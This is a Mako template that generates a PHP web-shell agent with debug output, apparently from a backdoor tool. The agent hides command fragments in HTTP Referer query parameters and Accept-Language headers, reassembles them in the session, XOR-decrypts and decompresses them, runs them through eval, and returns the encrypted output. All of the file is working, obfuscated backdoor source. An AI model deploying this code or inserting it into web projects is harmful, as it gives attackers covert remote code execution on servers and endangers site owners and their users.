<%! import hashlib %><%
key = hashlib.md5(password).hexdigest().lower()
header = key[:4]
footer = key[4:8]
%>$kh="${header}";
$kf="${footer}";
<%text>
/* The comments has to be in this style, or they will break the minimization during obfuscation */
$k=$kh.$kf;
function x($t,$k){
	$c=strlen($k);
	$l=strlen($t);
	$o="";
	for($i=0;$i<$l;){
		for($j=0;($j<$c&&$i<$l);$j++,$i++)
		{
			$o.=$t{$i}^$k{$j};
		}
	}
	return $o;
}

$r=$_SERVER;
$rr=@$r["HTTP_REFERER"];
$ra=@$r["HTTP_ACCEPT_LANGUAGE"];
print("<${k}DEBUG>CHECK1 ?</${k}DEBUG>");
if($rr&&$ra){
	print("<${k}DEBUG>CHECK1 OK!</${k}DEBUG>");

	/* function()[] direct access is not allowed in PHP < 5.4 */
	$u=parse_url($rr);
	parse_str($u["query"],$q);
	$q=array_values($q);
	preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);

	print("<${k}DEBUG>ORDER: "); var_dump($q); var_dump($m[2]); print("</${k}DEBUG>");

	print("<${k}DEBUG>CHECK2 ?</${k}DEBUG>");
	if($q&&$m){
		print("<${k}DEBUG>CHECK2 OK!</${k}DEBUG>");
		@session_start();

		$s=&$_SESSION;
		$ss="substr";
		$sl="strtolower";

		$i=$m[1][0].$m[1][1];
		$h=$sl($ss(md5($i.$kh),0,3));
		$f=$sl($ss(md5($i.$kf),0,3));

		$p="";
		for($z=1;$z<count($m[1]);$z++) $p.=$q[$m[2][$z]];

		print("<${k}DEBUG>HEADER \"$h\" ?</${k}DEBUG>");
		if(strpos($p,$h)===0){
			print("<${k}DEBUG>HEADER OK!</${k}DEBUG>");
			$s[$i]="";
			$p=$ss($p,3);
		}

		print("<${k}DEBUG>ID \"$i\" IN SESSION?</${k}DEBUG>");
		if(array_key_exists($i,$s)){
			print("<${k}DEBUG>ID OK!</${k}DEBUG>");
			$s[$i].=$p;

			$e=strpos($s[$i],$f);
			print("<${k}DEBUG>FOOTER \"$f\" ?</${k}DEBUG>");
			if($e){
				print("<${k}DEBUG>FOOTER OK! FINAL: $s[$i]</${k}DEBUG>");
				$k=$kh.$kf;
				ob_start();
				eval(gzuncompress(x(base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));
				$o=ob_get_contents();
				ob_end_clean();
				$d=base64_encode(x(gzcompress($o),$k));
				print("<$k>$d</$k>");
				@session_destroy();
			}
		}
	}
}
</%text>
